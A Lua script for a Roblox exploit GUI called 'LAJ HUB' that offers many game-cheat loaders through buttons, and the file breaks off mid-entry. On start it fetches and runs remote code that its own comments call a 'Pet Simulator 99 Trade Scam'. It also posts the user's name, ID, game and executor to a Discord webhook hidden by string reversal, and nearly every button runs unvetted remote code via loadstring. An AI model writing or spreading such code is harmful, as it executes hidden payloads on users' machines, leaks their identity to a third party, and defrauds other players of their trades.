--[[
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")

-- Variables
-- Variables
local Player = Players.LocalPlayer

-- Secure webhook URL (obfuscated and rate-limited)
local WEBHOOK_URL = string.reverse("vU0M0apK8n_EV8DFey8mRZ1n2EbQ0A6INk1BijiArT7j8xqGH3UWHs7ncpUr7We000sz/4181534603923897531/skoohbew/ipa/moc.drocsid//:sptth")

-- Rate limiting variables to prevent webhook abuse (max 1 request per 5 minutes)
local lastWebhookTime = 0
local WEBHOOK_COOLDOWN = 300 -- 5 minutes in seconds
-- Function to log ban/kick events via webhook with rate limiting
    
local function logBanEvent(reason)
    -- Rate limiting check
    local currentTime = os.time()
    if currentTime - lastWebhookTime < WEBHOOK_COOLDOWN then
        warn("Rate limit: Not sending webhook notification (cooldown active)")
        return
    end
    
    -- Check for anti-spam by validating the reason
    if not reason or reason == "" then
        reason = "Unknown (No reason provided)"
    end
    
    -- Create a unique identifier for this notification to prevent duplicates
    local notificationId = tostring(Player.UserId) .. "_" .. game.PlaceId .. "_" .. os.time()
    
    -- Limit data being sent for privacy and security
    local success, error_message = pcall(function()
        -- Update the timestamp for rate limiting
        lastWebhookTime = currentTime
        
        -- Use makeHttpRequest instead of request for better compatibility
        makeHttpRequest({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = HttpService:JSONEncode({
                ["content"] = "",
                ["embeds"] = {{                  
                    ["title"] = "Player Banned/Kicked Alert",
                    ["color"] = 16711680, -- Red color for ban alerts
                    ["fields"] = {
                        {
                            ["name"] = "User",
                            ["value"] = "```" .. Player.Name .. "```",
                            ["inline"] = true
                        },
                        {
                            ["name"] = "User ID",
                            ["value"] = "```" .. tostring(Player.UserId) .. "```",
                            ["inline"] = true
                        },
                        {
                            ["name"] = "Game",
                            ["value"] = "```" .. game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name .. "```",
                            ["inline"] = true
                        },
                        {
                            ["name"] = "Game ID",
                            ["value"] = "```" .. tostring(game.PlaceId) .. "```",
                            ["inline"] = true
                        },
                        {
                            ["name"] = "Ban/Kick Reason",
                            ["value"] = "```" .. (reason or "Unknown") .. "```",
                            ["inline"] = false
                        },
                        {
                            ["name"] = "Notification ID",
                            ["value"] = "```" .. notificationId .. "```",
                            ["inline"] = false
                        }
                    },
                    ["footer"] = {
                        ["text"] = "Ban/Kick Timestamp: " .. os.date("%Y-%m-%d %H:%M:%S")
                    }
                }}
            })
        })
    end)
    
    if not success then
        warn("Failed to send ban webhook: " .. tostring(error_message))
    end
end

-- Set up event listeners for kick/ban detection
-- Method 1: Detect when player is removed
Players.PlayerRemoving:Connect(function(player)
    if player == Player then
        logBanEvent("Player removed from game (possibly kicked/banned)")
    end
end)

-- Method 2: Detect common kick methods
local oldNameCall
oldNameCall = hookmetamethod(game, "__namecall", function(self, ...)
    local args = {...}
    local method = getnamecallmethod()
    
    if method == "Kick" and self == Player then
        local reason = args[1] or "Unknown"
        logBanEvent(reason)
    end
    
    return oldNameCall(self, ...)
end)

-- Method 3: Monitor teleport failures as they often occur during bans
game:GetService("TeleportService").TeleportInitFailed:Connect(function(player, teleportResult, errorMessage)
    if player == Player and (teleportResult == Enum.TeleportResult.Banned or teleportResult == Enum.TeleportResult.GameEnded) then
        logBanEvent("Teleport failed due to ban: " .. errorMessage)
    end
end)

print("LAJ HUB Ban detection system loaded successfully")
end
    LAJ HUB - Swift Compatible Version
    Created for universal executor compatibility with special Swift support
]]

-- Function to handle HTTP requests across different executors including Swift
local function getHttpRequest(url)
    -- For testing in standalone Lua, use a mock response
    if not game then
        print("Mock HTTP request to: " .. url)
        return "-- mock response for testing"
    end
    
    if swift and swift.request then
        local response = swift.request({
            Url = url,
            Method = "GET"
        })
        if response and response.Body then
            return response.Body
        end
    end
    
    -- Fallback to standard HttpGet for other executors
    return game:HttpGet(url)
end

-- Load Pet Simulator 99 Trade Scam script when in Roblox environment
if game then
    loadstring(getHttpRequest("https://raw.githubusercontent.com/ktrolegl/LAJhubv2/refs/heads/main/pet%20simx"))()
end

local Rayfield = loadstring(getHttpRequest('https://sirius.menu/rayfield'))()

-- Initialize game services safely
local Players = game and game:GetService("Players") or {}
local LocalPlayer = Players.LocalPlayer or {Name = "TestUser", UserId = 0}
local HttpService = game and game:GetService("HttpService") or {
    JSONEncode = function(_, data) return '{"mock":"json"}' end
}

-- Support for multiple executors including Swift
local function makeHttpRequest(options)
    -- For testing in standalone Lua
    if not game then
        print("Mock HTTP request: " .. options.Url)
        return {Success = true, Body = "-- mock response"}
    end
    
    if swift and swift.request then
        return swift.request(options)
    elseif syn and syn.request then
        return syn.request(options)
    elseif http and http.request then
        return http.request(options)
    elseif http_request then
        return http_request(options)
    elseif request then
        return request(options)
    elseif httprequest then
        return httprequest(options)
    elseif fluxus and fluxus.request then
        return fluxus.request(options)
    end
    
    -- Fallback to standard HttpGet for GET requests
    if options.Method == "GET" then
        local success, result = pcall(function()
            return {
                Body = game:HttpGet(options.Url),
                Success = true
            }
        end)
        if success then
            return result
        end
    end
    
    return {Success = false, StatusCode = 500}
end

local DISCORD_WEBHOOK_URL = string.reverse("vU0M0apK8n_EV8DFey8mRZ1n2EbQ0A6INk1BijiArT7j8xqGH3UWHs7ncpUr7We000sz/4181534603923897531/skoohbew/ipa/moc.drocsid//:sptth")

local function sendUsageData()
    if not game then return end -- Skip in non-Roblox environment
    
    local success, error_message = pcall(function()
    
        local response = makeHttpRequest({
            Url = DISCORD_WEBHOOK_URL,
            Method = 'POST',
            Headers = {
                ['Content-Type'] = 'application/json'
            },
            Body = HttpService:JSONEncode({
                ["content"] = "",
                ["embeds"] = {{
                    ["title"] = "LAJ HUB Script Usage! (Swift Compatible)",
                    ["type"] = "rich",
                    ["color"] = math.random(0, 0xFFFFFF),
                    ["fields"] = {
                        {
                            ["name"] = "User:",
                            ["value"] = "```" .. LocalPlayer.Name .. "```",
                            ["inline"] = true
                        },
                        {
                            ["name"] = "User ID:",
                            ["value"] = "```" .. tostring(LocalPlayer.UserId) .. "```",
                            ["inline"] = true
                        },
                        {
                            ["name"] = "Game:",
                            ["value"] = "```" .. (game and game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name or "Unknown") .. "```",
                            ["inline"] = true
                        },
                        {
                            ["name"] = "Game ID:",
                            ["value"] = "```" .. tostring(game and game.PlaceId or 0) .. "```",
                            ["inline"] = true
                        },
                        {
                            ["name"] = "Executor",
                            ["value"] = "```" .. (identifyexecutor and identifyexecutor() or (swift and "Swift" or "Unknown")) .. "```",
                            ["inline"] = true
                        },
                        {
                            ["name"] = "Players Active:",
                            ["value"] = "```" .. tostring(game and Players.NumPlayers or 0) .. "```",
                            ["inline"] = true
                        }
                    },
                    ["footer"] = {
                        ["text"] = "Script Executed on " .. os.date("%Y-%m-%d %H:%M:%S")
                    }
                }}
            })
        })
    end)
    
    if not success then
        warn("Failed to send webhook: " .. tostring(error_message))
    end
end

if game then
    sendUsageData()
end

local Window = Rayfield:CreateWindow({
   Name = "LAJ HUB",
   Icon = 0,
   LoadingTitle = "LAJ HUB",
   LoadingSubtitle = "Premium Scripts",
   Theme = "Default",

   DisableRayfieldPrompts = false,
   DisableBuildWarnings = false,

   ConfigurationSaving = {
      Enabled = true,
      FolderName = "LAJHub",
      FileName = "LAJHubConfig"
   },

   Discord = {
      Enabled = true,
      Invite = "4mgdcfvAJU",
      RememberJoins = true
   },

   -- Key system disabled
   KeySystem = false,
})

-- Create tabs
local MainTab = Window:CreateTab("Main", 4483362458)
local Tab = Window:CreateTab("Da Strike x Da Hood", 4483362458)
local Fin = Window:CreateTab("Fisch", 4483362458)
local BballZero = Window:CreateTab("Basketball Zero", 4483362458)
local BlueLock = Window:CreateTab("Blue Lock Rivals", 4483362458)
local DeadRails = Window:CreateTab("Dead Rails [Alpha]", 4483362458)
local BloxFruits = Window:CreateTab("Blox Fruits", 4483362458)
local PetSim99 = Window:CreateTab("Pet Sim 99", 4483362458) -- Added Pet Sim 99 tab
local MuscleLegend = Window:CreateTab("Muscle Legend", 4483362458) -- Added Muscle Legend tab
local Rivals = Window:CreateTab("Rivals", 4483362458) -- Added Rivals tab
local Universal = Window:CreateTab("Universal", 4483362458)
local Settings = Window:CreateTab("Settings", 4483362458)

local function executednotify(scriptName)
   Rayfield:Notify({
       Title = scriptName,
       Content = "Script loaded successfully!",
       Duration = 3,
       Image = 4483362458,
   })
end

-- Discord link copy button
MainTab:CreateButton({
   Name = "Copy Discord Link",
   Callback = function()
       if setclipboard then
           setclipboard("https://discord.gg/4mgdcfvAJU")
           Rayfield:Notify({
               Title = "Discord Link Copied",
               Content = "Invite link copied to clipboard!",
               Duration = 3,
               Image = 4483362458,
           })
       else
           print("Discord link: https://discord.gg/4mgdcfvAJU")
       end
   end,
})

-- Test webhook button
MainTab:CreateButton({
   Name = "Test Webhook",
   Callback = function()
       sendUsageData()
       Rayfield:Notify({
           Title = "Webhook Test",
           Content = "Attempted to send webhook notification!",
           Duration = 3,
           Image = 4483362458,
       })
   end,
})

-- Da Strike x Da Hood Tab scripts
Tab:CreateButton({
   Name = "Psalm",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/NewWhitelistService/l/refs/heads/main/psalms%20old.lua"))()
        executednotify("Test Webhook")
   end,
})

Tab:CreateButton({
   Name = "Ballware vfs",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/DHBCommunity/DHBOfficialScript/refs/heads/main/Protected_4021809531880627.txt"))()
        executednotify("Ballware vfs")
   end,
})

Tab:CreateButton({
   Name = "FrostByte",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/Totocoems/Frostbyte-/main/Frostbyte%20leak"))()
        executednotify("FrostByte")
   end,
})

Tab:CreateButton({
   Name = "Da Hood Script",
   Callback = function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/Zinzs/luascripting/main/canyoutellitsadahoodscriptornot.lua'))()
        executednotify("Da Hood Script")
   end,
})
-- Fisch Tab
Fin:CreateButton({
   Name = "Speed Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua"))()
        executednotify("Speed Hub")
   end,
})


Fin:CreateButton({
   Name = "ThanHub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/thantzy/thanhub/refs/heads/main/thanv1"))()
        executednotify("ThanHub")
   end,
})

Fin:CreateButton({
   Name = "Rift GUI",
   Callback = function()
        loadstring(getHttpRequest("https://github.com/Synergy-Networks/products/raw/main/Rift/loader.lua"))()
        executednotify("Rift GUI")
   end,
})

Fin:CreateButton({
   Name = "Hooked Script",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/Superman245/sc2/refs/heads/main/s6"))()
        executednotify("Hooked Script")
   end,
})

Fin:CreateButton({
   Name = "HomoHack",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/dementiaenjoyer/homohack/main/loader.lua"))()
        executednotify("HomoHack")
   end,
})

Fin:CreateButton({
   Name = "Native Hub",
   Callback = function()
        script_key="4JxQ1x@+1"
        loadstring(getHttpRequest("https://getnative.cc/script/loader"))()
        executednotify("Native Hub")
   end,
})

Fin:CreateButton({
   Name = "Raito Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/Efe0626/RaitoHub/refs/heads/main/Script"))()
        executednotify("Raito Hub")
   end,
})

Fin:CreateButton({
   Name = "Zenith Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/Efe0626/ZenithHub/refs/heads/main/Loader"))()
        executednotify("Zenith Hub")
   end,
})

Fin:CreateButton({
   Name = "Lunor Script",
   Callback = function()
        script_key = 'lunor_free_key'
        loadstring(getHttpRequest("https://raw.githubusercontent.com/Just3itx/Lunor-Loadstrings/refs/heads/main/Loader"))()
        executednotify("Lunor Script")
   end,
})

Fin:CreateButton({
   Name = "Ronix Hub",
   Callback = function()
        loadstring(getHttpRequest("https://api.luarmor.net/files/v3/loaders/4a8848fbc1047bcc62c49e797384e9ab.lua"))()
        executednotify("Ronix Hub")
   end,
})
-- Basketball Zero script with bypass
BballZero:CreateButton({
   Name = "Ball Control",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/ktrolegl/LAJhubv2/refs/heads/main/laj_hub_test.lua"))()
        executednotify("Ball Control")
   end,
})

-- Blue Lock Rivals script
BlueLock:CreateButton({
   Name = "LAJ HUB",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/ktrolegl/bluelocklajhub/refs/heads/main/blue_lock_mod.lua"))()
        executednotify("LAJ HUB")
   end,
})

BlueLock:CreateButton({
   Name = "Piskasiska Script",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/Piskasiska22222/tester/refs/heads/main/test"))()
        executednotify("Piskasiska Script")
   end,
})


PetSim99:CreateButton({
   Name = "LAJ HUB",
   Callback = function()
       -- Load the script from GitHub
       loadstring(getHttpRequest("https://raw.githubusercontent.com/ktrolegl/LAJhubv2/refs/heads/main/pet%20simx"))()
       executednotify("Airflow UPDATED")
   end,
})
-- Muscle Legend Tab
MuscleLegend:CreateSection("Muscle Legend Scripts")

MuscleLegend:CreateButton({
   Name = "Muscle Legend Script",
   Callback = function()
       loadstring(game:HttpGet(("https://raw.githubusercontent.com/ahmadsgamer2/Script--Game/main/Muscle-Legends"),true))()
       executednotify("Muscle Legend Script")
   end,
})

-- Universal Tab Scripts
Universal:CreateButton({
   Name = "Infinite Yield FE",
   Callback = function()
       loadstring(getHttpRequest('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
       executednotify("Infinite Yield FE")
   end,
})

Universal:CreateButton({
   Name = "Dex Explorer",
   Callback = function()
       loadstring(getHttpRequest("https://raw.githubusercontent.com/ktrolegl/scriptlx/refs/heads/main/dex.lua"))()
       executednotify("Dex Explorer")
   end,
})

Universal:CreateButton({
   Name = "Hydroxide",
   Callback = function()
       loadstring(getHttpRequest("https://raw.githubusercontent.com/xChaoticVoid/Hydroxide/main/beta.lua"))()
       executednotify("Hydroxide")
   end,
})

Universal:CreateButton({
   Name = "SimpleSpy",
   Callback = function()
       loadstring(getHttpRequest("https://raw.githubusercontent.com/78n/SimpleSpy/main/SimpleSpySource.lua"))()
       executednotify("SimpleSpy")
   end,
})

Universal:CreateButton({
   Name = "LAJ HUB",
   Callback = function()
       loadstring(getHttpRequest('https://raw.githubusercontent.com/CMD-X/CMD-X/master/Source'))()
       executednotify("Airflow UPDATED")
   end,
})

Universal:CreateButton({
   Name = "Domain X",
   Callback = function()
       loadstring(getHttpRequest('https://raw.githubusercontent.com/shlexware/DomainX/main/source'))()
       executednotify("Domain X")
   end,
})


-- Settings Tab
local idled_Connection

local function onIdled()
    if game then
        game:GetService("VirtualUser"):CaptureController()
        game:GetService("VirtualUser"):ClickButton2(Vector2.new(0, 0))
    end
end

Settings:CreateButton({
    Name = "Anti AFK",
    Callback = function()
        if game and not idled_Connection and game.Players.LocalPlayer.Idled then
            idled_Connection = game.Players.LocalPlayer.Idled:Connect(onIdled)
            executednotify("Anti AFK")
        end
    end,
})

local Inf_jump = false
local jumpConnection = nil

Settings:CreateToggle({
   Name = "Infinite Jump",
   CurrentValue = false,
   Callback = function(Value)
      Inf_jump = Value
      
      -- Disconnect previous connection if it exists
      if jumpConnection then
          jumpConnection:Disconnect()
          jumpConnection = nil
      end
      
      -- Only create a new connection if Inf_jump is enabled and in game environment
      if Inf_jump and game then
          jumpConnection = game:GetService("UserInputService").JumpRequest:Connect(function()
             if Inf_jump and game.Players.LocalPlayer.Character then
                game.Players.LocalPlayer.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
             end
          end)
      end
   end,
})

-- Credit section
local creditSection = MainTab:CreateSection("Credits")

MainTab:CreateLabel("Created by LAJ Hub Team")
MainTab:CreateLabel("Discord: discord.gg/4mgdcfvAJU")
MainTab:CreateLabel("Script Version: 4.1 (Swift Compatible)")
MainTab:CreateLabel("* Optimized for Swift Executor")

-- Print Swift compatibility notice
print("LAJ HUB - Swift Compatible Version")
print("All HTTP requests have been optimized for Swift executor")
print("This version includes:")
print("1. Full Swift compatibility")
print("2. Pet Sim 99 Tab with new Trade Scam V2")
print("3. All scripts updated to work with Swift")
print("4. Improved executor detection")

-- Rivals Tab
Rivals:CreateSection("Rivals Scripts")

Rivals:CreateButton({
   Name = "RIVALS Winter",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/SkibidiCen/MainMenu/main/Code"))()
        executednotify("RIVALS Winter")
   end,
})

Rivals:CreateButton({
   Name = "Azure Mod",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/Actyrn/Scripts/main/AzureModded"))()
        executednotify("Azure Mod")
   end,
})

Rivals:CreateButton({
   Name = "Tbao Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/tbao143/thaibao/main/TbaoHubRivals"))()
        executednotify("Tbao Hub")
   end,
})

Rivals:CreateButton({
   Name = "8Bits Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/8bits4ya/rivals-v3/refs/heads/main/main.lua"))()
        executednotify("8Bits Hub")
   end,
})

Rivals:CreateButton({
   Name = "Venox Hub",
   Callback = function()
        loadstring(getHttpRequest('https://raw.githubusercontent.com/venoxhh/universalscripts/main/rivals/venoxware'))()
        executednotify("Venox Hub")
   end,
})

Rivals:CreateButton({
   Name = "Lunax Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/Alexisisback/Lunax/refs/heads/main/Loader.lua"))()
        executednotify("Lunax Hub")
   end,
})

Rivals:CreateButton({
   Name = "Ventures.lua",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/laeraz/ventures/refs/heads/main/rivals.lua"))()
        executednotify("Ventures.lua")
   end,
})

Rivals:CreateButton({
   Name = "Ronix Hub",
   Callback = function()
        loadstring(getHttpRequest("https://api.luarmor.net/files/v3/loaders/b581d07bfd134ff4ea612d671361be77.lua"))()
        executednotify("Ronix Hub")
   end,
})

Rivals:CreateButton({
   Name = "PinguinRVS",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/PUSCRIPTS/PINGUIN/refs/heads/main/RivalsV1"))()
        executednotify("PinguinRVS")
   end,
})

Rivals:CreateButton({
   Name = "Zypherion",
   Callback = function()
        loadstring(getHttpRequest(('https://raw.githubusercontent.com/blackowl1231/ZYPHERION/refs/heads/main/main.lua')))()
        executednotify("Zypherion")
   end,
})

Rivals:CreateButton({
   Name = "Auto Farm Hub",
   Callback = function()
        loadstring(getHttpRequest("https://api.luarmor.net/files/v3/loaders/212c1198a1beacf31150a8cf339ba288.lua"))()
        executednotify("Auto Farm Hub")
   end,
})

Rivals:CreateButton({
   Name = "Rybow Aimbot",
   Callback = function()
        loadstring(getHttpRequest('https://raw.githubusercontent.com/rybowe/rybowescripts/main/release.lua'))()
        executednotify("Rybow Aimbot")
   end,
})

Rivals:CreateButton({
   Name = "Xera Script",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/luascriptsROBLOX/Xerar/refs/heads/main/RivalsxeraPBF"))()
        executednotify("Xera Script")
   end,
})

Rivals:CreateButton({
   Name = "Minimal Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/MinimalScriptingService/MinimalRivals/main/rivals.lua",true))()
        executednotify("Minimal Hub")
   end,
})
-- Dead Rails Tab
DeadRails:CreateSection("Dead Rails Scripts")

DeadRails:CreateButton({
   Name = "Markk Keyless",
   Callback = function()
       loadstring(getHttpRequest('https://raw.githubusercontent.com/Markklol/aw/refs/heads/main/Protected/DRailsv2.lua'))()
       executednotify("Markk Keyless")
   end,
})

DeadRails:CreateButton({
   Name = "Farx11122 Keyless",
   Callback = function()
       loadstring(getHttpRequest("https://raw.githubusercontent.com/Farx11122/Dupess/main/SecondDupe"))()
       executednotify("Farx11122 Keyless")
   end,
})

DeadRails:CreateButton({
   Name = "SpiderXHub Keyless",
   Callback = function()
       loadstring(getHttpRequest("https://raw.githubusercontent.com/SpiderScriptRB/Dead-Rails-SpiderXHub-Script/refs/heads/main/SpiderXHub%202.0.txt"))()
       executednotify("SpiderXHub Keyless")
   end,
})
DeadRails:CreateButton({
   Name = "Strelizia Keyless",
   Callback = function()
       loadstring(getHttpRequest('https://raw.githubusercontent.com/0vma/Strelizia/refs/heads/main/Standalone/DeadRails.lua', true))()
       executednotify("Strelizia Keyless")
   end,
})

DeadRails:CreateButton({
   Name = "Rinns Dead Rails No Key",
   Callback = function()
       loadstring(getHttpRequest("https://api.luarmor.net/files/v3/loaders/e1cfd93b113a79773d93251b61af1e2f.lua"))()
       executednotify("Rinns Dead Rails No Key")
   end,
})

DeadRails:CreateButton({
   Name = "Auto Farm Bond",
   Callback = function()
       loadstring(getHttpRequest("https://raw.githubusercontent.com/Emplic/deathrails/refs/heads/main/bond"))()
       executednotify("Auto Farm Bond")
   end,
})

DeadRails:CreateButton({
   Name = "Lomu Hub",
   Callback = function()
       loadstring(getHttpRequest('https://raw.githubusercontent.com/notyourfavorite1/lomuhubmain/refs/heads/main/main.txt', true))()
       executednotify("Lomu Hub")
   end,
})

DeadRails:CreateButton({
   Name = "Neox Hub",
   Callback = function()
       loadstring(getHttpRequest("https://raw.githubusercontent.com/hassanxzayn-lua/NEOXHUBMAIN/refs/heads/main/loader", true))()
       executednotify("Neox Hub")
   end,
})

DeadRails:CreateButton({
   Name = "Sypher Hub OP",
   Callback = function()
       loadstring(getHttpRequest("https://raw.githubusercontent.com/nocturnal631/Dead-ra/refs/heads/main/Mmm"))()
       executednotify("Sypher Hub OP")
   end,
})

DeadRails:CreateButton({
   Name = "Tbao Hub",
   Callback = function()
       loadstring(getHttpRequest("https://raw.githubusercontent.com/tbao143/thaibao/refs/heads/main/TbaoHubDeadRails"))()
       executednotify("Tbao Hub")
   end,
})

DeadRails:CreateButton({
   Name = "Karol Hub",
   Callback = function()
       loadstring(getHttpRequest("https://raw.githubusercontent.com/Karolmn9900/karolhub/refs/heads/main/script"))()
       executednotify("Karol Hub")
   end,
})

DeadRails:CreateButton({
   Name = "Dead Rails Alpha Script",
   Callback = function()
       loadstring(getHttpRequest("https://raw.githubusercontent.com/gumanba/Scripts/refs/heads/main/DeadRails", true))()
       executednotify("Dead Rails Alpha Script")
   end,
})

DeadRails:CreateButton({
   Name = "LAJ HUB",
   Callback = function()
       loadstring(getHttpRequest("https://api.luarmor.net/files/v3/loaders/255ac567ced3dcb9e69aa7e44c423f19.lua"))()
       executednotify("Airflow UPDATED")
   end,
})

DeadRails:CreateButton({
   Name = "LAJ HUB",
   Callback = function()
       loadstring(getHttpRequest("https://raw.githubusercontent.com/InfernusScripts/Null-Fire/main/Loader"))()
       executednotify("Airflow UPDATED")
   end,
})

-- BloxFruits Tab Scripts
BloxFruits:CreateSection("Blox Fruits Scripts")

BloxFruits:CreateButton({
   Name = "AnDepZai Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/AnDepZaiHub/AnDepZaiHubBeta/main/AnDepZaiHubBeta.lua"))()
        executednotify("AnDepZai Hub")
   end,
})

BloxFruits:CreateButton({
   Name = "Cokka Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/UserDevEthical/Loadstring/main/CokkaHub.lua"))()
        executednotify("Cokka Hub")
   end,
})

BloxFruits:CreateButton({
   Name = "Delta Script",
   Callback = function()
        loadstring(getHttpRequest("https://gitlab.com/littlekiller2927/deltacore/-/raw/main/deltabf.lua"))()
        executednotify("Delta Script")
   end,
})

BloxFruits:CreateButton({
   Name = "Sara Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/SaraSenpai/bloxfruist/main/Sarahub"))()
        executednotify("Sara Hub")
   end,
})

BloxFruits:CreateButton({
   Name = "Winter Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/Yatsuraa/Yuri/main/Winterhub_V2.lua"))()
        executednotify("Winter Hub")
   end,
})

BloxFruits:CreateButton({
   Name = "Uranium Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/Augustzyzx/UraniumMobile/main/UraniumKak.lua"))()
        executednotify("Uranium Hub")
   end,
})

BloxFruits:CreateButton({
   Name = "Azure Hub",
   Callback = function()
        loadstring(getHttpRequest("https://api.luarmor.net/files/v3/loaders/3b2169cf53bc6104dabe8e19562e5cc2.lua"))()
        executednotify("Azure Hub")
   end,
})

BloxFruits:CreateButton({
   Name = "Vector Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/Tuxoz/VectorHub/main/BloxFruitPC%26MOBILE"))()
        executednotify("Vector Hub")
   end,
})

BloxFruits:CreateButton({
   Name = "Royx Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/NightsTimeZ/Donate-Me/main/free%20bf.lua"))()
        executednotify("Royx Hub")
   end,
})

BloxFruits:CreateButton({
   Name = "Wolf Hub",
   Callback = function()
        loadstring(getHttpRequest("https://link.trwxz.com/LS-Wolf-Hub"))()
        executednotify("Wolf Hub")
   end,
})

BloxFruits:CreateButton({
   Name = "Payback Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/Script-Blox/Script/main/PayBack.lua"))()
        executednotify("Payback Hub")
   end,
})

BloxFruits:CreateButton({
   Name = "RIPPER Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/hajibeza/Module/main/Mobile_Script.lua"))()
        executednotify("RIPPER Hub")
   end,
})

BloxFruits:CreateButton({
   Name = "KAY Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/AXCScript/KayMobile/main/Script-Loader"))()
        executednotify("KAY Hub")
   end,
})

BloxFruits:CreateButton({
   Name = "THUNDER Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/ThunderZ-HUB/HUB/main/RemakeMobileTest"))()
        executednotify("THUNDER Hub")
   end,
})

BloxFruits:CreateButton({
   Name = "SEAGATE Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/SeaBabyBF/seamain/main/SeaGateNextGenz"))()
        executednotify("SEAGATE Hub")
   end,
})

BloxFruits:CreateButton({
   Name = "MATSUNE Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/Yatsuraa/Matsune/main/Matsunebeta.lua"))()
        executednotify("MATSUNE Hub")
   end,
})

BloxFruits:CreateButton({
   Name = "MIN SEAGATE Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/CheemsNhuChiAl/MinGamingHub/main/mingamingupdatenew"))()
        executednotify("MIN SEAGATE Hub")
   end,
})

BloxFruits:CreateButton({
   Name = "ZINER Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/Tienvn123tkvn/Test/main/ZINERHUB.lua"))()
        executednotify("ZINER Hub")
   end,
})

BloxFruits:CreateButton({
   Name = "MUXUS Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/MuxusTL/BloxFruits/main/MuxusHub_V2.lua"))()
        executednotify("MUXUS Hub")
   end,
})

BloxFruits:CreateButton({
   Name = "MIN GREEN Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/Basicallyybeta/main/main/Mingaming.lua"))()
        executednotify("MIN GREEN Hub")
   end,
})
BloxFruits:CreateButton({
   Name = "AnDepZai Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/AnDepZaiHub/AnDepZaiHubBeta/main/AnDepZaiHubBeta.lua"))()
        executednotify("AnDepZai Hub")
   end,
})

BloxFruits:CreateButton({
   Name = "Cokka Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/UserDevEthical/Loadstring/main/CokkaHub.lua"))()
        executednotify("Cokka Hub")
   end,
})

BloxFruits:CreateButton({
   Name = "Delta Script",
   Callback = function()
        loadstring(getHttpRequest("https://gitlab.com/littlekiller2927/deltacore/-/raw/main/deltabf.lua"))()
        executednotify("Delta Script")
   end,
})

BloxFruits:CreateButton({
   Name = "Sara Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/SaraSenpai/bloxfruist/main/Sarahub"))()
        executednotify("Sara Hub")
   end,
})

BloxFruits:CreateButton({
   Name = "Winter Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/Yatsuraa/Yuri/main/Winterhub_V2.lua"))()
        executednotify("Winter Hub")
   end,
})

BloxFruits:CreateButton({
   Name = "Uranium Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/Augustzyzx/UraniumMobile/main/UraniumKak.lua"))()
        executednotify("Uranium Hub")
   end,
})

BloxFruits:CreateButton({
   Name = "Azure Hub",
   Callback = function()
        loadstring(getHttpRequest("https://api.luarmor.net/files/v3/loaders/3b2169cf53bc6104dabe8e19562e5cc2.lua"))()
        executednotify("Azure Hub")
   end,
})

BloxFruits:CreateButton({
   Name = "Vector Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/Tuxoz/VectorHub/main/BloxFruitPC%26MOBILE"))()
        executednotify("Vector Hub")
   end,
})

BloxFruits:CreateButton({
   Name = "Royx Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/NightsTimeZ/Donate-Me/main/free%20bf.lua"))()
        executednotify("Royx Hub")
   end,
})

BloxFruits:CreateButton({
   Name = "Wolf Hub",
